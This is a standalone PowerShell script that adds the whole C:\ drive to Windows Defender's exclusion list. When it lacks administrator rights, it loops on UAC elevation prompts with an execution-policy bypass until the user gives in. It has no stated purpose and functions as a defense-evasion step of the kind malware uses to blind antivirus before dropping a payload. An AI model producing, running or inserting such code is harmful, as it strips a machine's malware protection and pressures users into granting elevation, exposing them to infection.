function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Add-DefenderExclusion {
    Set-MpPreference -ExclusionPath "C:\" -Force
    Write-Host "Successfully excluded C:\ from Windows Defender" -ForegroundColor Green
    
    if ((Get-MpPreference).ExclusionPath -contains "C:\") {
        Write-Host "Verified: C:\ is in the exclusion list" -ForegroundColor Green
    } else {
        Write-Host "Warning: C:\ may not have been added" -ForegroundColor Yellow
    }
    pause
    exit
}

# Main logic
if (Test-Admin) {
    Add-DefenderExclusion
}

# Loop until elevated
while (-not (Test-Admin)) {
    Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
    
    try {
        $p = Start-Process PowerShell.exe -ArgumentList "-NoExit -NoProfile -ExecutionPolicy Bypass -Command `"Set-MpPreference -ExclusionPath 'C:\' -Force; Write-Host 'C:\ excluded from Windows Defender' -ForegroundColor Green; pause; exit`"" -Verb RunAs -PassThru -WindowStyle Normal
        if ($p) { exit }
    }
    catch {
        Write-Host "Elevation denied or failed. Retrying..." -ForegroundColor Red
    }
}
